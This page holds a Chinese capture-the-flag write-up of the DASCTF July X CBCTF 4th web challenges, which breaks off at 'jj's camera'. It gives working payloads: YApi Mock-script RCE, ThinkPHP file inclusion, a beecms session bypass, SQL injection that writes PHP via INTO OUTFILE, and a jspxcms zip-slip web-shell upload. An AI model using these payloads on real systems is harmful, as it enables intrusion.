@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Webezrce题目给出的 YApi 环境是 1.9.2，搜索可知这个版本存在已知的 RCE 漏洞。添加一个 API，设置一个高级 Mock 脚本。  12const process &#x3D; this.constructor.constructor(&amp;#x27;return process&amp;#x27;)()mockJson &#x3D; process.mainModule.require(&quot;chil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF July X CBCTF 4th">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/aa6ae99.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Webezrce题目给出的 YApi 环境是 1.9.2，搜索可知这个版本存在已知的 RCE 漏洞。添加一个 API，设置一个高级 Mock 脚本。  12const process &#x3D; this.constructor.constructor(&amp;#x27;return process&amp;#x27;)()mockJson &#x3D; process.mainModule.require(&quot;chil">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1627798784656689/4623f9157e849515821906397d15fa00597eea23.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628063348856028/4fbd617592a2f64ebc53dc64e3ad154662f1ae0c.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628041914070540/0a0131de6eb133ca61a03eacff8395334530eb6d.png@100w">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957019574/acb2f2d4b9866383393d8523ebe557185a893ead.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957089324/264269688a4baa36f4d0ac382f7d2428f1e6d43b.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628044046032440/ca2d0d3cf3f4b90d86205296338807d85ccd3421.png@100w">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073325447688/eb36c389b6ce0d68f826ff546207cd719c3c53c7.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073094260532/aaef211d4c8254b08abca5e52fbe402cd456c93b.png">
+<meta property="article:published_time" content="2021-07-31T16:22:00.000Z">
+<meta property="article:modified_time" content="2021-10-28T12:21:39.481Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1627798784656689/4623f9157e849515821906397d15fa00597eea23.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/avatar.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>DASCTF July X CBCTF 4th</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/aa6ae99.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/603682ab.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/aa6ae99.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&text=DASCTF July X CBCTF 4th"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&is_video=false&description=DASCTF July X CBCTF 4th"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DASCTF July X CBCTF 4th&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/aa6ae99.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&name=DASCTF July X CBCTF 4th&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&t=DASCTF July X CBCTF 4th"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrce"><span class="toc-number">1.1.</span> <span class="toc-text">ezrce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easythinkphp"><span class="toc-number">1.2.</span> <span class="toc-text">easythinkphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-flag"><span class="toc-number">1.3.</span> <span class="toc-text">cat flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cybercms"><span class="toc-number">1.4.</span> <span class="toc-text">cybercms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jspxcms"><span class="toc-number">1.5.</span> <span class="toc-text">jspxcms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jj%E2%80%99s-camera"><span class="toc-number">1.6.</span> <span class="toc-text">jj’s camera</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#red-vs-blue"><span class="toc-number">2.1.</span> <span class="toc-text">red_vs_blue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#funny-maze"><span class="toc-number">2.2.</span> <span class="toc-text">funny_maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nuclear-wastewater"><span class="toc-number">2.3.</span> <span class="toc-text">Nuclear wastewater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-a-GIF"><span class="toc-number">2.4.</span> <span class="toc-text">Just a GIF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezSteganography"><span class="toc-number">2.5.</span> <span class="toc-text">ezSteganography</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DASCTF July X CBCTF 4th
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-31T16:22:00.000Z" itemprop="datePublished">2021-08-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><p>题目给出的 YApi 环境是 1.9.2，搜索可知这个版本存在已知的 RCE 漏洞。添加一个 API，设置一个高级 Mock 脚本。</p>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> process = <span class="built_in">this</span>.constructor.constructor(<span class="string">&#x27;return process&#x27;</span>)()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /f*&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1627798784656689/4623f9157e849515821906397d15fa00597eea23.png"></p>
+<p>访问 API 的 Mock 地址即可获得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d747e97d-58b0-4316-8740-3970e028c864&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a></p>
+</blockquote>
+<p>直接使用参考中的 payload 包含出 flag。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0d004dc0-dbaf-41b5-a2cc-e21c1a5be878&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><blockquote>
+<p>管理员曾访问过flag</p>
+</blockquote>
+<p>题目给出的代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$cmd</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = escapeshellarg(<span class="variable">$cmd</span>);</span><br><span class="line">        system(<span class="string">&#x27;cat &#x27;</span> . <span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现存在文件读取，结合提示先访问一下 nginx 的配置文件 <code>/var/log/nginx/access.log</code>。可以发现存在如下访问记录。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [11&#x2F;Jul&#x2F;2020:00:00:00 +0000] &quot;GET &#x2F;this_is_final_flag_e2a457126032b42d.php HTTP&#x2F;1.1&quot; 200 5 &quot;-&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko&#x2F;20100101 Firefox&#x2F;89.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>此时可以尝试包含 <code>this_is_final_flag_e2a457126032b42d.php</code> 来获取 flag，但此处 flag 位于正则的黑名单内，需要使用一个 Unicode 字符来绕过。构造出 <code>this_is_final_f%falag_e2a457126032b42d.php</code> 即可绕过此处的黑名单而正常包含到文件，得到如下信息。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;2176d788-e2ed-4818-96ea-76ab24a64260&#125;&#x27;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2176d788-e2ed-4818-96ea-76ab24a64260&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><p>很明显靶机是 beecms，尝试寻找已存在的漏洞。使用如下载荷可以快速获得 admin 权限。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mx_form/mx_form.php?id=12</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>96</span><br><span class="line"></span><br><span class="line">_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>进入后台后发现文件上传处没有写权限，因此无法写入 shell 进行 RCE。此时回到登录界面，发现其中存在 SQL 注入，尝试一把梭写入 PHPINFO。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/login.php?action=ck_login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>208</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=admin&#x27;/**/union/**/selselectect/**/0x3c3f70687020706870696e666f28293b203f3e,1,1,1,1/**/into/**/outfoutfileile/**/&#x27;/var/www/html/phpinfo.php&#x27;/**/%23&amp;password=hex&amp;code=&amp;submit=true&amp;submit.x=27&amp;submit.y=31</span><br></pre></td></tr></table></figure>
+
+<p>发现可以成功访问到 PHPINFO，且没有 disable_functions，于是写 shell 进行 RCE，得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;72723792-5469-43b9-b6c0-0d03b51b0193&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><p>admin 和空密码登录到后台，发现有文件上传。使用冰蝎的 shell.jsp 构建 war 包，然后使用如下载荷构建恶意 zip 包。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">war = <span class="built_in">open</span>(<span class="string">&#x27;zfsn.war&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">zipFile = zipfile.ZipFile(<span class="string">&quot;zfsn.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">info = zipfile.ZipInfo(<span class="string">&quot;zfsn.zip&quot;</span>)</span><br><span class="line">zipFile.writestr(<span class="string">&quot;../../../zfsn.war&quot;</span>, war)</span><br><span class="line">zipFile.close()</span><br></pre></td></tr></table></figure>
+
+<p>将压缩文档以上传文件的方式上传到靶机，并点击解压，即可在 <code>.../zfsn/shell.jsp</code> 获得 shell。使用冰蝎连接即可得到 flag。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628063348856028/4fbd617592a2f64ebc53dc64e3ad154662f1ae0c.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a72908e2-c6c3-455c-a129-17208d595884&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h3><blockquote>
+<p>网上能搜到源码，仅修改了前端ui，注意服务器的响应</p>
+</blockquote>
+<p>在网上可以找到关键部分 qdl.php 的源码。</p>
